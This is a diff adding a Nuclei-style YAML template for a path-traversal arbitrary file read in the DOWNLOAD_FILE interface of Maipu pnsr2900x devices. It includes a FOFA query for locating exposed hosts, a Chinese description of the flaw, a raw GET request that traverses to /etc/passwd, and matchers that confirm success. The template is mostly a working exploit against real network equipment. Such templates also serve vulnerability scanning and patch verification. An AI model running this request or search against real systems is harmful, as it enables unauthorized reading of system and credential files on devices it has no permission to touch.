@@ -1,0 +1,25 @@
+id: maipu-pnsr2900x-download_file-lfi
+
+info:
+  name: "迈普 pnsr2900x 系统 DOWNLOAD_FILE 接口任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="/assets/css/ui-dialog.css"&& body="/form/formUserLogin"
+          迈普 pnsr2900x 系统的 DOWNLOAD_FILE 接口存在文件访问控制缺陷，攻击者可通过构造特定路径参数读取任意文件内容，导致系统配置文件、敏感数据及凭证信息泄露，可能进一步引发横向渗透攻击和系统权限提升。该漏洞威胁系统的机密性与完整性。
+  tags: 迈普
+
+http:
+- raw:
+  - |
+    GET /DOWNLOAD_FILE/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
